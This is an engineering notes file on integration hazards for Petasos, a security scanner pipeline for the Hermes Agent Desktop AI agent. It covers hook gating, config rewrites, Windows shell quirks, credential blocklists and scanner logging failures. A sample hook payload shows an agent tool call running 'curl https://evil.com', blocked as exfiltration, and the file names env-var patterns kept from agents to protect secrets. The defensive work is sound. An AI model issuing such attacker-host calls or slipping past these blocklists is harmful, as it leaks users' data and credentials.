# Petasos — Hermes Desktop Integration Footguns

**Purpose:** Platform-specific hazards for implementers building the Petasos
content security pipeline against Hermes Agent Desktop (Electron + Python).
Covers both macOS and Windows installer paths.

**Hermes version baseline:** v0.14.0+

---

## 1. File Tools Bypass the Terminal Backend

The single most important thing to know.

The `terminal` tool routes through the configured backend (local/docker/ssh).
But the `file` toolset — `read_file`, `write_file`, `patch`, `search` — runs
**inside the Hermes Electron process**, not through the terminal backend. Docker
sandboxing does not cover file tools.

```
terminal tool  →  DockerEnvironment._run_bash()  →  container
file tools     →  Electron process Python         →  host filesystem directly
```

**Impact:** Petasos scanning must intercept both tool dispatch paths. A
`pre_tool_call` hook covers both, but if Petasos injects a scanner as a wrapper
around the terminal backend only, file-based exfiltration bypasses it entirely.

The same applies to `browser_*`, `vision_analyze`, `web_extract`, and
`web_search` — all execute in-process.

---

## 2. Config Section Fragility (Desktop UI Model Switcher)

`web_server.py:1053` — `setModelAssignment()` rewrites the `model:` section
with only `provider` and `default`. Any other key under `model:` is silently
dropped. `_preserve_env_ref_templates()` in `config.py:4174` only iterates keys
present in the incoming dict.

**What survives a UI model switch:**
- `custom_providers:` (separate top-level key)
- `delegation:` (separate top-level key)
- `model_aliases:` (separate top-level key)
- `mcp_servers:` (separate top-level key)
- Any new top-level key Petasos adds (e.g., `petasos:`)

**What gets wiped:**
- `model.api_key` (root cause of the recurring 401 bug)
- `model.base_url` (cleared on provider change)
- `model.context_length` (cleared on provider change)
- Any key injected under `model:` that isn't `provider` or `default`

**Guidance:** Petasos config MUST be a top-level key in config.yaml, not nested
under `model:` or any section the UI rewrites. Example:

```yaml
petasos:
  enabled: true
  scanners: [presidio, llm-guard]
  escalation_tier: standard
```

---

## 3. Session Boundary — Config Is Snapshot-on-Start

Config changes only take effect in **new sessions**. Running chat tabs keep
the model, credentials, and tool registrations they started with. There is no
hot-reload mechanism for config.yaml.

**Impact:** Toggling Petasos on/off, changing scanner config, or adjusting
escalation tiers won't affect active conversations. The Desktop frontend must
either:
- (a) Prompt the user to start a new session after config change, or
- (b) Inject a `/model` slash command to force a mid-session reload (but this
  only refreshes the model, not tool registrations or hooks)

If Petasos registers as a tool-call hook, the hook list is also frozen at
session start.

---

## 4. Shell Hooks — The Official Extension Point (and Its Limits)

Hermes ships a hook system (`agent/shell_hooks.py`) designed for pre/post tool
gating. Config:

```yaml
hooks:
  pre_tool_call:
    - matcher: "terminal|write_file|patch"
      command: "~/.hermes/petasos/scan.sh"
      timeout: 10
```

**Hook payload (JSON on stdin):**
```json
{
  "hook_event_name": "pre_tool_call",
  "tool_name": "terminal",
  "tool_input": {"command": "curl https://evil.com"},
  "session_id": "sess_abc123",
  "cwd": "/workspace"
}
```

**Hook response (JSON on stdout):**
```json
{"decision": "block", "reason": "Exfiltration attempt detected"}
```

### Footguns:

**4a. Hooks are subprocess-based.** Every hook invocation spawns a process.
On Windows, this means Git Bash (`C:\Program Files\Git\usr\bin\bash.exe`),
adding ~100-200ms overhead per tool call. For Python-heavy scanners, this
means a full interpreter startup per call unless you implement a long-lived
daemon that the hook script curls into.

**4b. First-use consent prompt.** Each `(event, command)` pair triggers a
one-time TTY consent prompt, persisted to `~/.hermes/shell-hooks-allowlist.json`.
Non-interactive runs (gateway, cron) need `--accept-hooks`,
`HERMES_ACCEPT_HOOKS=1`, or `hooks_auto_accept: true` in config. Desktop
sessions are interactive so this fires on first boot after config change.

**4c. macOS vs Windows script paths.** Hook commands go through `shlex.split()`.
On macOS: `command: "~/.hermes/petasos/scan.sh"` works directly. On Windows:
`~` expands to `C:\Users\Jorda`, but the script runs under Git Bash, so forward
slashes work. However, the shebang line (`#!/usr/bin/env python3`) resolves
differently — MINGW64 Python vs system Python vs venv Python.

**4d. Hooks don't intercept MCP tool results.** `post_tool_call` fires after
MCP tools return, but the hook only sees the tool name and input, not the
result content. To scan MCP results, you'd need `post_tool_call` with result
access — check if the hook payload includes `tool_output` (it may not in all
versions).

---

## 5. Windows Terminal = Git Bash (MINGW64)

All `terminal` tool execution on Windows goes through Git Bash, not cmd.exe
or PowerShell. Detection chain in `local.py:219` (`_find_bash()`):

1. `HERMES_GIT_BASH_PATH` env var
2. Hermes portable Git bundled with installer
3. `shutil.which("bash")`
4. `C:\Program Files\Git\usr\bin\bash.exe`
5. `C:\Program Files (x86)\Git\usr\bin\bash.exe`

**Impact for Petasos:**
- Scanner CLIs invoked via terminal tool run under MINGW64, not native Windows
- Paths are POSIX-style (`/c/Users/Jorda/...`) inside the shell
- `_msys_to_windows_path()` (`local.py:22`) translates paths at the boundary
- Python packages installed via pip in MINGW64 Python are different from system
  Python or WSL Python
- If Petasos ships a CLI scanner, it must work under MINGW64 **or** be invoked
  via the hook system (which also uses Git Bash on Windows)

On macOS, terminal uses the system shell directly — no translation layer.

---

## 6. Env Var Credential Isolation

`local.py:79` — `_build_provider_env_blocklist()` strips sensitive env vars
from the terminal subprocess environment. Currently blocks:

- `*_API_KEY`, `*_TOKEN`, `*_SECRET` patterns for known providers
- Prevents model API keys from leaking into user-executed commands

**Impact:** If Petasos needs API keys (e.g., for a cloud-hosted scanner), those
keys must be:
1. Added to the blocklist so they don't leak into terminal commands
2. Available in the Hermes process environment (for in-process scanning)
3. NOT available in Docker containers (unless explicitly forwarded via
   `docker_forward_env`)

The `docker_forward_env` config key explicitly names which env vars are passed
into Docker containers:

```yaml
terminal:
  backend: docker
  docker_forward_env:
    - "GITHUB_TOKEN"
    # DO NOT add PETASOS_API_KEY here
```

---

## 7. MCP Tools — Separate Dispatch, Separate Threading

MCP tools run on a dedicated asyncio event loop in a daemon thread
(`mcp_tool.py`). The dispatch path is:

```
model requests tool "mcp_vigil_harbor_memory_search"
    → tool_executor.py dispatches
    → mcp_tool.call_tool() schedules on _mcp_loop
    → asyncio transport.call_tool() RPC
    → result flows back synchronously to the model
```

**Footguns:**

**7a. MCP tool injection into every prompt.** MCP server tools are injected into
every LLM request regardless of `platform_toolsets`. The `tools.include`
whitelist on the MCP server config is the only filter. This means every scanner
tool definition Petasos exposes via MCP adds to prompt bloat.

**7b. Threading model.** Synchronous scanning code cannot be injected into the
MCP async event loop without `asyncio.run_coroutine_threadsafe()` or a sync
wrapper. If Petasos scans MCP results, the scanner must be async-compatible or
wrapped.

**7c. HTTP headers for identity.** MCP HTTP transport injects headers from
config. Currently Gavin sends `X-Agent-Id: gavin` and `X-OpenClaw-Secret`.
If Petasos adds an MCP server, its auth headers go in the same `headers:` dict.
These are expanded from `${VAR}` templates at connect time, not at request time.

---

## 8. Platform Config Paths

| Item | macOS | Windows |
|------|-------|---------|
| Hermes home | `~/.hermes/` | `%LOCALAPPDATA%\hermes\` |
| config.yaml | `~/.hermes/config.yaml` | `%LOCALAPPDATA%\hermes\config.yaml` |
| .env | `~/.hermes/.env` | `%LOCALAPPDATA%\hermes\.env` |
| Hook allowlist | `~/.hermes/shell-hooks-allowlist.json` | `%LOCALAPPDATA%\hermes\shell-hooks-allowlist.json` |
| MCP stderr logs | `~/.hermes/logs/mcp-stderr.log` | `%LOCALAPPDATA%\hermes\logs\mcp-stderr.log` |
| Skills | `~/.hermes/skills/` | `%LOCALAPPDATA%\hermes\skills\` |
| Session logs | `~/.hermes/logs/session_*.json` | `%LOCALAPPDATA%\hermes\logs\session_*.json` |

**Installer path:** The Hermes Agent Python code lives inside the Electron
app bundle. On macOS it's inside `Hermes.app/Contents/Resources/`. On Windows
it's under the install directory (typically `%LOCALAPPDATA%\hermes\hermes-agent\`).

**Petasos scanner binaries** should go under `~/.hermes/petasos/` (or equivalent)
to stay in the user-writable config space, not inside the app bundle (which gets
overwritten on updates).

---

## 9. Process Spawning Differences

| Concern | macOS | Windows |
|---------|-------|---------|
| Default shell | `/bin/zsh` or `/bin/bash` | Git Bash (MINGW64) |
| Python invocation | `python3` | `python` or `python3` (depends on install) |
| Process signals | SIGTERM, SIGINT work | SIGTERM not reliable; uses `taskkill` patterns |
| Subprocess cleanup | `os.killpg()` works | Process group kill requires `CREATE_NEW_PROCESS_GROUP` |
| Path separator | `/` everywhere | `\` natively, `/` in Git Bash |
| Temp directory | `/tmp` or `$TMPDIR` | `%TEMP%` (`C:\Users\X\AppData\Local\Temp`) |
| File locking | `fcntl.flock()` | `msvcrt.locking()` or `portalocker` |

**Impact:** If Petasos spawns scanner processes (LLM Guard, Presidio), process
lifecycle management must handle both signal models. Python's `subprocess` module
abstracts most of this, but timeout-and-kill patterns differ.

---

## 10. Tool Guardrails (Existing Framework)

`agent/tool_guardrails.py` provides a pre-call decision framework already in the
dispatch pipeline. Petasos should evaluate whether to:

- **(a) Layer on top** via shell hooks (cleanest separation, no code changes to
  Hermes, but subprocess overhead)
- **(b) Register as a Python plugin** via `hermes_cli/plugins.py` (faster, but
  couples to Hermes internals and gets overwritten on updates)
- **(c) Extend tool_guardrails.py** (tightest integration, but requires
  maintaining a fork or contributing upstream)

The guardrails framework already tracks:
- Repeated tool failures (same tool, same args)
- Idempotent no-progress loops
- Configurable warn/hard-stop thresholds

---

## 11. save_config() Atomicity

`config.py:4543` — `save_config()` writes atomically (write to temp, rename).
But on Windows, atomic rename can fail if another process has the file open
(Defender real-time scanning, editor file watchers, etc.).

If Petasos modifies config.yaml programmatically, it must use the same
`save_config()` path or implement the same atomic-write-and-rename pattern.
Direct `open(path, 'w')` risks corruption if the Desktop UI saves concurrently.

---

## 12. Docker Backend Specifics

When `terminal.backend: docker`:

- Container image is pulled on first command (can take minutes on first use)
- `container_persistent: true` preserves filesystem across sessions
- `docker_mount_cwd_to_workspace: false` means NO host filesystem access from
  terminal — the container is fully isolated
- `docker_run_as_host_user: true` drops SETUID/SETGID caps
- Container resource limits: `container_cpu`, `container_memory`, `container_disk`

**Petasos scanners in Docker:** If a scanner needs to run inside the container
(e.g., scanning files the agent writes in-container), the scanner binary must
be baked into the Docker image or installed at session init. The default image
(`nikolaik/python-nodejs:python3.11-nodejs20`) doesn't include security tools.

**Petasos scanners outside Docker:** If scanners run in the host process
(intercepting tool calls before they reach the container), they have full
host access but the latency is lower and no image customization is needed.

---

## 13. Credential Sanitization

`env_loader.py:78` — `_sanitize_loaded_credentials()` strips non-ASCII
characters from env vars matching `*_API_KEY`, `*_TOKEN`, `*_SECRET`, `*_KEY`.
This prevents Unicode lookalike attacks from copy-pasted credentials.

If Petasos uses env vars for its own credentials, name them to match this
pattern (e.g., `PETASOS_API_KEY`) to get free sanitization. If they don't match
the pattern, Unicode corruption from PDF-pasted values is a risk.

---

## 14. Streaming and Mid-Turn Behavior

The Desktop app streams tokens via the web server API. Tool calls are captured
silently during streaming — the user sees the response text building up, then
tool call results appear.

If Petasos blocks a tool call (via hook returning `{"decision": "block"}`), the
model receives the block message as the tool result and must decide what to do.
The user sees this as part of the normal response flow. There's no separate
"security alert" UI channel — the block reason appears inline in the
conversation.

**Frontend binding implication:** If Petasos wants a dedicated security alert
UI (outside the chat flow), it needs a separate API endpoint on the web server
or a sidecar notification mechanism. The hook system's stdout response only
flows back into the model context.

---

## 15. Profile Homes Orphan Plugins on Upgrade

Hermes v0.16 introduced per-profile homes (`profiles/<active>/`). The
config migration copies config keys — including `petasos:` — into the
profile home, but it does **not** copy plugin files. After a Hermes
major or minor upgrade:

- The dashboard shows the `petasos:` config section (it reads config
  from the profile home) — enforcement *appears* configured.
- But the plugin files (`__init__.py`, `plugin.yaml`) are still in the
  v0.15 root `plugins/petasos/` directory, not the profile's.
- Hermes's plugin discovery scans the profile home's `plugins/`
  directory. No plugin files there → the plugin isn't loaded →
  enforcement is **silently off**.

This is the worst failure mode for a security plugin: everything looks
configured, nothing is enforced, and there is no error in the logs.

**Platform paths:**

| Location | macOS | Windows |
|----------|-------|---------|
| v0.15 root plugins | `~/.hermes/plugins/petasos/` | `%LOCALAPPDATA%\hermes\plugins\petasos\` |
| v0.16 profile plugins | `~/.hermes/profiles/<active>/plugins/petasos/` | `%LOCALAPPDATA%\hermes\profiles\<active>\plugins\petasos\` |

**Impact:** Silent enforcement loss after any Hermes upgrade that
introduces or changes profile home semantics.

**Mitigation:**

1. The `loading config from ... [tier=...]` INFO line (PET-86) in
   `agent.log` confirms which config was resolved.
2. `verify.py` checks plugin files at the resolved location and detects
   root/profile config split-brain.
3. After upgrading Hermes: re-copy plugin files to the profile home and
   restart. See `hermes-desktop.md` § "Upgrading Hermes orphans plugins."

---

## 16. In-Process Stdio Contract (_SafeWriter) and ML Scanner Logging

Hermes wraps `sys.stdout`/`sys.stderr` with `_SafeWriter`
(`agent/process_bootstrap.py:63`) — a slots-only class with **no
`__weakref__`** — at process start, on both the gateway and dashboard
processes. Any in-process library that takes a weak reference to the
stream it writes to explodes on it. Concretely: structlog's `PrintLogger`
keys a per-file write-lock registry by weakref
(`structlog/_output.py`, `WRITE_LOCKS`), and structlog's default factory
captures `sys.stdout` at import time — so llm-guard's first emitted log
line dies with `TypeError: cannot create weak reference to '_SafeWriter'
object` (PET-92; the scanner then reports the cached error on every
scan).

Petasos neutralizes this in `LlmGuardScanner`'s deferred init
(`petasos/scanners/llm_guard.py` — see `_WeakrefableStdout`,
`_STDOUT_PROXY`, `_SHIELD_LOCK`): it calls
`llm_guard.util.configure_logger(stream=_STDOUT_PROXY)` with a
petasos-owned weakref-able passthrough proxy that late-binds the
*current* `sys.stdout` at write time. Never write to raw
`sys.__stdout__` in-process — swallowed broken pipes are precisely what
`_SafeWriter` exists to prevent.

**Documented residuals:**

- `configure_logger` calls `logging.basicConfig(...)` — a no-op under a
  configured host (Hermes), but in a logging-unconfigured embedder the
  first scan attaches a root StreamHandler and other libraries' INFO
  logs start appearing on stdout.
- The `transformers` and `presidio-analyzer` stdlib loggers are forced
  to WARNING process-wide (upstream `configure_logger` behavior) —
  sibling scanners' backend log verbosity drops; findings unaffected.
- The host's structlog configuration, if any, is replaced (llm-guard's
  logging is process-global by upstream design).
- Any later in-process `configure_logger()` call with a default stream
  (host code, a second llm-guard embedder, a notebook) re-binds structlog
  to raw wrapped stdio and re-introduces the crash; scans degrade to
  `ScanResult.error` (never throw) until `LlmGuardScanner.reset()`
  re-applies the shield on the next scan. `reset()` is
  maintenance-window-only — quiesce scans first; calling it under live
  traffic can yield empty findings with no error.
- On Windows, *any* `configure_logger` call (including external ones)
  also triggers colorama to globally swap `sys.stdout`/`sys.stderr` to
  `ansitowin32.StreamWrapper` — Petasos snapshots and restores stdio
  around its own call, but cannot undo a swap performed by an external
  caller, and `reset()` does not recover stdio identity.
- ANSI color codes from llm-guard's console renderer pass through
  uninterpreted after the restore (garbled escapes on legacy conhost;
  cosmetic only).

**Impact:** Without the shield, LLM Guard is dead in-process while
reporting healthy (pre-PET-87) or `unavailable` (post-PET-87).

**Mitigation:** ships in Petasos (PET-92); regression-tested in
`tests/test_llm_guard_wrapper.py` with a slots-only stand-in. If a
sibling ML backend ever logs through a stream-weakref path, apply the
same proxy pattern.

### LlamaFirewall — the same probe, applied (PET-105)

`LlamaFirewallScanner` loads `llamafirewall` / PromptGuard on the same
in-process path under Hermes's `_SafeWriter`, so PET-105 asks the
pre-registered follow-through question above: *does `llamafirewall` route
a log line through the structlog stream-weakref path?* It is answered by a
**model-free canary** —
`tests/test_llama_firewall_wrapper.py::TestProbeWeakrefUnderSlotsStdio` — a
fresh subprocess that installs a slots-only, non-`__weakref__` stdout from
interpreter start and drives `LlamaFirewallScanner().scan()` with no HF
token (the load gate-returns at the PromptGuard prereq check before any
model load), then reports `OK`/`WEAKREF`. It runs on the shipping PR via
the upgraded non-skipping `extras-llamafirewall` lane
(`PETASOS_REQUIRE_LLAMAFIREWALL=1`, path-filtered `pull_request`), so the
answer cannot silently skip, and it stands as a canary: a future
`llamafirewall` upgrade that begins logging through structlog's default
`PrintLogger` re-trips it in CI.

**Verdict: not exposed (DE outcome 3 — import-window clean; model-gated
residual filed).** The upgraded `extras-llamafirewall` lane (PR #84, run
`27490922095`) ran the probe **GREEN — `OK EMITTED=0`**: under a slots-only,
non-`__weakref__` stdout the import/load window raised no weakref and emitted
**zero bytes** (the scan returned the expected PromptGuard-prereq error,
confirming the load gate-returned before any model build). The load-bearing
*reason*, captured by an introspection step in the same lane (not assumed):

- `llamafirewall` logs through **stdlib `logging`** —
  `logging.getLogger("llamafirewall")` is a plain logger, no custom handlers,
  `propagate=True`. Stdlib logging never takes a weak reference to its stream,
  unlike structlog's `PrintLogger`.
- **`structlog` is not in the `petasos[llamafirewall]` dependency closure**
  (`import structlog` → `ModuleNotFoundError` in the lane). The `WRITE_LOCKS`
  weak-keyed registry that detonates on `_SafeWriter` is therefore absent — the
  crash class is categorically impossible for `llamafirewall`, in *any* window,
  not only the one the model-free probe exercised.

So **no `petasos/` shield is ported**: porting the PET-92 proxy on a parity
assumption is exactly the unverified-guess failure mode PET-92 → PET-104
exposed. The canary (`TestProbeWeakrefUnderSlotsStdio`) now pins the property —
a future `llamafirewall` upgrade that routes logging through structlog's
default `PrintLogger` (or any weakref-keyed-stream path) re-trips it RED in the
non-skipping lane instead of silently re-creating the production-dead failure.

**Settled (PET-110, 2026-06-14):** the construction/scan window was checked
empirically on gibson — the model-bearing host where the accepted
Llama-Prompt-Guard-2-86M license + HF token satisfy `_prompt_guard_prereq_error`,
the predicate corrected in PET-100 (not PET-97, which is leetspeak normalization).
The shipped gated test
`tests/test_llama_firewall_wrapper.py::TestShieldUnderSlotsStdio::test_llamafirewall_scan_under_slots_stdio_completes`
ran **online** (no `HF_HUB_OFFLINE=1`) and passed weakref-clean (`1 passed`): a real
`LlamaFirewallScanner().scan()` of an injection string under slots-only,
non-`__weakref__` stdout returned `error is None` with a `petasos.llamafirewall.*`
finding — no `cannot create weak reference` anywhere. This **confirms** the
categorical mechanism reason above (it does not *replace* it), and together they
close both the construction/scan-window residual and the `HF_HUB_OFFLINE=1`
online-emission caveat: the online run surfaced no weakref-keyed import-time line
(the only warnings were `torch.jit` deprecation notices — stdlib/torch, not
weakref-keyed). Evidence: `docs/specs/TODO/PET-110.test-output.txt`.

---

## 17. CodeShield Unusable on Native Windows (semgrep-core + symlink)

`LlamaFirewallScanner(enable_code_shield=True)` cannot run on **native Windows**
because of two independent defects in upstream `codeshield` v1.0.1
(`insecure_code_detector/oss.py`):

1. `_get_semgrep_core_path` probes for `semgrep-core` with no `.exe` suffix. On
   Windows the binary ships as `semgrep-core.exe` (`semgrep/bin/`, semgrep
   1.165.0 win_amd64), so the lookup misses it — unlike semgrep's own
   `semgrep_core.py`, which appends `.exe` on Windows. Failure surfaces as
   `code_shield: Failed to find semgrep-core in PATH or in the semgrep package.`
2. `_make_semgrep_binary_path` creates an `osemgrep` symlink at import time via
   `os.symlink`, which on Windows requires Developer Mode or admin.

**Workaround:** run the CodeShield path under WSL, where `semgrep-core` (no
suffix) is present and `os.symlink` is unprivileged. PromptGuard and
AgentAlignment are unaffected and run natively.

**Test handling (PET-101):** the two CodeShield integration assertions
self-skip-with-reason on native Windows via a model-free `_code_shield_prereq_error`
locatability probe (`petasos/scanners/llama_firewall.py`), mirroring the
PromptGuard prereq gate; they run unchanged where semgrep-core is locatable. The
probe is **advisory** — production CodeShield loading/fail-mode is unchanged.

---

## Summary: Integration Surface Ranking

| Surface | Difficulty | Platform Risk | Recommended |
|---------|-----------|---------------|-------------|
| Shell hooks (`pre_tool_call`) | Low | Medium (Git Bash on Windows) | Yes — start here |
| Top-level config key (`petasos:`) | Low | Low | Yes — config lives here |
| Python plugin (`hermes_cli/plugins.py`) | Medium | Low | Maybe — faster but coupled |
| Tool guardrails extension | High | Low | No — fork maintenance burden |
| Custom MCP server | Medium | Low | Maybe — for session-aware state |
| Docker image customization | Medium | Medium (image pull time) | No — unnecessary coupling |
| Profile home plugin files | Low | **High** (silent enforcement loss) | Yes — verify after every Hermes upgrade |
| In-process stdio contract (`_SafeWriter`) | Low | **High** (ML scanner dead in-process) | Yes — shield ships in Petasos (PET-92) |
| CodeShield (semgrep-core) | — | **High** (dead on native Windows) | WSL only |

---

*Pair with: Petasos spec (in progress), `gavin-security-sweep.md` (2026-05-23),
`gavin-discovery-responses.md` (2026-05-24)*
